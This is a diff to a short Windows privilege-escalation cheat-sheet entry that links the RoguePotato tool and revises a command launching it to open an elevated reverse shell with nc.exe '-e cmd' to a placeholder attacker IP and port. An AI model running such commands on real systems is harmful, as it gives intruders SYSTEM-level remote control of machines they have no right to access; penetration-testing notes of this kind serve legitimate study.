@@ -4,9 +4,16 @@
 #plateform/windows #target/local #cat/PRIVESC/TOKEN
 
 
-## elevated reverse shell
+## test
+https://github.com/antonioCoco/RoguePotato
 ```cmd
-.\RoguePotato.exe -r <ip> -c "c:\tools\nc.exe <ip> <port> -e cmd" -l 9999
+todo
+```
+
+## elevated reverse shell
+https://github.com/antonioCoco/RoguePotato
+```cmd
+.\RoguePotato.exe -r <ip> -e "<nc_exe_path> <ip> <port> -e cmd" -l 9999
 ```
 
 
